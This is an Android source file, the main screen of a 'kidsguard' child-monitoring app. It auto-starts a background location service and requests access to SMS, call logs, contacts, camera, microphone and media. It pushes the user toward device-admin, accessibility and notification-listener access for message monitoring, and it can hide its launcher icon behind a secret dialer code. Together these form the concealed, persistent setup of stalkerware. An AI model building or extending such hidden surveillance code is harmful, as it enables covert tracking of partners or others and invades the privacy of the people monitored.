package com.kidsguard.child;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int REQ_CRITICAL = 101;

    SharedPreferences prefs;
    TextView tvDeviceId;
    Button btnStartService;
    Button btnStopService;
    Button btnHideApp;
    Button btnPermissions;
    Button btnAccessibility;
    Button btnDeviceAdmin;
    Button btnNotifAccess;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        prefs = getSharedPreferences(LocationService.PREFS, 0);

        tvDeviceId = findViewById(R.id.tvDeviceId);
        btnStartService = findViewById(R.id.btnStartService);
        btnStopService = findViewById(R.id.btnStopService);
        btnHideApp = findViewById(R.id.btnHideApp);
        btnPermissions = findViewById(R.id.btnPermissions);
        btnAccessibility = findViewById(R.id.btnAccessibility);
        btnDeviceAdmin = findViewById(R.id.btnDeviceAdmin);
        btnNotifAccess = findViewById(R.id.btnNotifAccess);

        String deviceId = LocationService.getSafeDeviceId(this);
        if (deviceId == null || deviceId.isEmpty()) {
            tvDeviceId.setText("Device code unavailable");
            btnStartService.setEnabled(false);
        } else {
            tvDeviceId.setText("Device Code: " + deviceId);
        }

        btnStartService.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startChildService();
            }
        });

        btnStopService.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                stopService(new Intent(MainActivity.this, LocationService.class));
                Toast.makeText(MainActivity.this, "Service stopped", Toast.LENGTH_SHORT).show();
            }
        });

        btnHideApp.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showHideDialog();
            }
        });

        btnPermissions.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAllPermissions();
            }
        });

        btnAccessibility.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                openSafely(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            }
        });

        btnDeviceAdmin.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                        new ComponentName(MainActivity.this, AdminReceiver.class));
                openSafely(intent);
            }
        });

        btnNotifAccess.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                openSafely(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            }
        });

        // Auto-start service safely
        startChildService();
    }

    private void startChildService() {
        if (LocationService.isRunning()) {
            Toast.makeText(this, "Service already running", Toast.LENGTH_SHORT).show();
            return;
        }
        try {
            Intent i = new Intent(this, LocationService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(i);
            } else {
                startService(i);
            }
            Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "Start failed: " + e.getClass().getSimpleName(), Toast.LENGTH_LONG).show();
        }
    }

    private void showHideDialog() {
        new AlertDialog.Builder(this)
                .setTitle("Hide App Icon")
                .setMessage("App icon will be hidden from launcher. " +
                        "Dial *#*#12345#*#* to reopen.")
                .setPositiveButton("HIDE", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        hideAppIcon();
                    }
                })
                .setNegativeButton("CANCEL", null)
                .show();
    }

    private void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName cn = new ComponentName(
                    this, "com.kidsguard.child.MainActivityLauncher");

            PackageInfo info = pm.getPackageInfo(getPackageName(), PackageManager.GET_ACTIVITIES);
            boolean present = false;
            if (info.activities != null) {
                for (ActivityInfo ai : info.activities) {
                    if (cn.getClassName().equals(ai.name)) {
                        present = true;
                        break;
                    }
                }
            }
            if (!present) {
                Toast.makeText(this, "Launcher alias missing — hide aborted", Toast.LENGTH_LONG).show();
                return;
            }

            pm.setComponentEnabledSetting(
                    cn,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);

            Toast.makeText(this,
                    "App hidden. Dial *#*#12345#*#* to reopen.",
                    Toast.LENGTH_LONG).show();

            Intent home = new Intent(Intent.ACTION_MAIN);
            home.addCategory(Intent.CATEGORY_HOME);
            home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(home);

        } catch (Exception e) {
            Toast.makeText(this, "Hide failed: " + e.getClass().getSimpleName(),
                    Toast.LENGTH_LONG).show();
        }
    }

    private void openSafely(Intent i) {
        try {
            startActivity(i);
        } catch (android.content.ActivityNotFoundException e) {
            Toast.makeText(this, "Open Settings manually to continue", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void requestAllPermissions() {
        if (Build.VERSION.SDK_INT >= 23) {
            List<String> neededList = new ArrayList<>();
            String[] allPerms = {
                    android.Manifest.permission.ACCESS_FINE_LOCATION,
                    android.Manifest.permission.ACCESS_COARSE_LOCATION,
                    android.Manifest.permission.CAMERA,
                    android.Manifest.permission.RECORD_AUDIO,
                    android.Manifest.permission.READ_SMS,
                    android.Manifest.permission.RECEIVE_SMS,
                    android.Manifest.permission.READ_CALL_LOG,
                    android.Manifest.permission.READ_CONTACTS,
                    android.Manifest.permission.READ_PHONE_STATE,
                    android.Manifest.permission.ANSWER_PHONE_CALLS,
                    android.Manifest.permission.CALL_PHONE,
            };

            for (String p : allPerms) {
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                    neededList.add(p);
                }
            }

            if (Build.VERSION.SDK_INT >= 33) {
                String[] api33Perms = {
                        android.Manifest.permission.POST_NOTIFICATIONS,
                        android.Manifest.permission.READ_MEDIA_IMAGES,
                        android.Manifest.permission.READ_MEDIA_VIDEO,
                        android.Manifest.permission.READ_MEDIA_AUDIO,
                };
                for (String p : api33Perms) {
                    if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                        neededList.add(p);
                    }
                }
            }

            if (!neededList.isEmpty()) {
                requestPermissions(neededList.toArray(new String[0]), REQ_CRITICAL);
            } else {
                checkSpecialPermissions();
            }
        } else {
            checkSpecialPermissions();
        }
    }

    private void checkSpecialPermissions() {
        if (!hasUsageStatsPermission()) {
            Toast.makeText(this, "Usage Access is required for screen time tracking", Toast.LENGTH_LONG).show();
            openSafely(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
            return;
        }
        if (!isNotificationListenerEnabled()) {
            Toast.makeText(this, "Notification Access is required for message monitoring", Toast.LENGTH_LONG).show();
            openSafely(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            return;
        }

        if (Build.VERSION.SDK_INT >= 23) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            openSafely(intent);
        }
        Toast.makeText(this, "All permissions verified", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode != REQ_CRITICAL) return;

        List<String> denied = new ArrayList<>();
        for (int i = 0; i < grantResults.length; i++) {
            if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                denied.add(permissions[i]);
            }
        }

        if (denied.isEmpty()) {
            checkSpecialPermissions();
            return;
        }

        boolean permanent = true;
        for (String p : denied) {
            if (shouldShowRequestPermissionRationale(p)) {
                permanent = false;
                break;
            }
        }

        if (permanent) {
            new AlertDialog.Builder(this)
                    .setTitle("Permission required")
                    .setMessage("Permissions are denied permanently. Please enable them in app settings.")
                    .setPositiveButton("OPEN SETTINGS", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface d, int w) {
                            openSafely(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                                    Uri.parse("package:" + getPackageName())));
                        }
                    })
                    .setNegativeButton("CANCEL", null)
                    .show();
        } else {
            Toast.makeText(this, "Denied permissions: " + denied.size(), Toast.LENGTH_LONG).show();
        }
    }

    private boolean isNotificationListenerEnabled() {
        String pkgName = getPackageName();
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(pkgName);
    }

    private boolean hasUsageStatsPermission() {
        android.app.AppOpsManager appOps = (android.app.AppOpsManager) getSystemService(APP_OPS_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT && appOps != null) {
            int mode = appOps.checkOpNoThrow(
                    android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(),
                    getPackageName()
            );
            return mode == android.app.AppOpsManager.MODE_ALLOWED;
        }
        return false;
    }
}
